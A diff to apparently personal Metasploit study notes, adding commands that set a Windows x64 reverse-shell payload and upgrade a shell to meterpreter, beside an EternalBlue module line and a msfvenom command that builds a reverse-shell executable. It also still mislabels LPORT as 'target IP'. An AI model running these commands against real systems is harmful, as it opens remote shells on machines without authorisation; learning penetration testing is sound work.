@@ -134,12 +134,19 @@ run
 run
 ```
 
-then move onto an 'sploit' directory within the msfconsole
+then move onto an 'exploit' directory within the msfconsole
 ```shell-session
 msf6 > use exploit/windows/smb/ms17_010_eternalblue 
 ```
 
 You can also list other available payloads using the `show payloads` command with any module.
+
+Windows set payload option
+`set payload windows/x64/shell/reverse_tcp`
+
+Changes regular reverse shell to meterpreter
+`use post/multi/manage/shell_to_meterpreter
+
 
 ## scanning using msfconsole
 
@@ -180,7 +187,7 @@ msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> 
 ```
 
 - -p    creates payload
-- windows/x64/shell/reverse_tcp     reverse shell for a x86 Linux Target
+- windows/x64/shell/reverse_tcp     reverse shell for a x86 WIndows Target
 - -f    prints to .exe format
 - lhost     listen IP
 - lport     target IP
